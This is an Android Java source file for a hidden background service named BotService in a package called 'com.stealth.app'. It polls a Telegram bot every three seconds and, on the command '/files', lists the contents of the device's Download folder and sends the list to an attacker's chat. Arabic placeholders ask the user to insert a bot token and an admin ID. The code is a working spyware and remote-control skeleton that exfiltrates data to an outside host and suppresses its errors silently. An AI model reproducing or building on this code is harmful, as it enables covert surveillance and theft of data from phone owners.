package com.stealth.app;
import android.app.Service; import android.content.Intent; import android.os.IBinder;
import java.io.*; import java.net.*; import java.util.Timer; import java.util.TimerTask;
public class BotService extends Service {
    String BOT_TOKEN = "ضع_توكن_البوت_هنا";
    String ADMIN = "ضع_ايديك_هنا";
    int lastUpdate = 0;
    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override public void run() { checkUpdates(); }
        }, 0, 3000);
        return START_STICKY;
    }
    void checkUpdates() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdate + 1));
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String res = in.readLine(); in.close();
            if(res.contains("\"text\":\"/files\"")) {
                lastUpdate = Integer.parseInt(res.split("\"update_id\":")[1].split(",")[0]);
                File dir = new File("/sdcard/Download/");
                String files = "الملفات:\n";
                for(File f : dir.listFiles()) files += f.getName() + "\n";
                sendMsg(files);
            }
        } catch(Exception e) {}
    }
    void sendMsg(String txt) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            OutputStreamWriter w = new OutputStreamWriter(c.getOutputStream());
            w.write("chat_id=" + ADMIN + "&text=" + URLEncoder.encode(txt, "UTF-8"));
            w.flush(); w.close(); c.getInputStream().close();
        } catch(Exception e) {}
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}